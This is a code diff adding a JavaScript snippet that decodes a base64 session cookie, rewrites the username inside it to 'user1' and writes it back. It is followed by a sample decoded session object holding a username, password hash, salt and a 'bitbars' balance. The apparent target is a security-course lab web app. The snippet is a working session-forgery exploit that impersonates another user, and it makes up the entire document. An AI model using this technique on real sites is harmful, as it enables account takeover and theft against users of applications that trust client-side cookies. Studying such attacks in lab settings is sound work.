@@ -1,0 +1,21 @@
+let cookieString = document.cookie;
+let base64Encoded = cookieString.split('=')[1];
+let decodedString = window.atob(base64Encoded);
+let parsedObject = JSON.parse(decodedString);
+parsedObject.account["username"] = "user1";
+let newEncoded = window.btoa(JSON.stringify(parsedObject));
+document.cookie = `session=${newEncoded}`;
+
+
+console.log(parsedObject);
+
+{
+  "loggedIn": true,
+  "account": {
+    "username": "hehe",
+    "hashedPassword": "4659f38e145287c012b4dd0702508109009575ec5ece53c6f90657e93bb8fd6b",
+    "salt": "3e690b291c1ce6728f81d8a940d60433378e0409c39e9f1e97fc04fed692aa26",
+    "profile": "wat",
+    "bitbars": 86
+  }
+}
